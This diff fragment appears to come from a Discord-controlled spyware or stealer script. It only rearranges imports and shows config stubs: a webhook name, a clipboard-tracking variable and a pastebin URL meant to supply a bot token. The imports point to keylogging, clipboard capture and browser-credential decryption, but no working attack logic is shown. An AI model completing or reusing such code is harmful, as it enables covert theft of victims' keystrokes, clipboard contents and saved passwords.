@@ -1,42 +1,28 @@
-
-import discord
-from discord.ext import commands
-import asyncio
-import pyperclip
-import subprocess
 import os
-import time
-from pynput import keyboard
-import threading 
-import shutil
-import pyttsx3
 import sys
-import comtypes
-import tempfile
-import ctypes
-import getpass
-import discord
-import zipfile
-import socket
-import aiohttp
+import time
 import json
 import base64
-import sqlite3
+import socket
 import shutil
-import win32crypt
-from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-import discord
+import ctypes
+import tempfile
+import getpass
+import random
+import string
+import threading
+import subprocess
 import asyncio
+import sqlite3
+import requests
+import platform
+import discord
+from discord.ext import commands
+from discord import File, Embed
 from datetime import datetime
 from pynput import keyboard
-import random
-import platform
-import time
-import requests
-import string
-import getpass
-from discord import File, Embed
-
+import pyttsx3
+import aiohttp
 # Dont Need This (Just lazy)
 last_clipboard = ""
 WEBHOOK_USERNAME = ""
@@ -57,7 +43,7 @@ payload = {
     ]
 }
 
-# Bot Token/Webhook Setup 
+#Bot Token/Webhook Setup 
 config_url = ""  # Replace with your pastebin link with bot token/webhook
 def load_credentials(url):
     try:
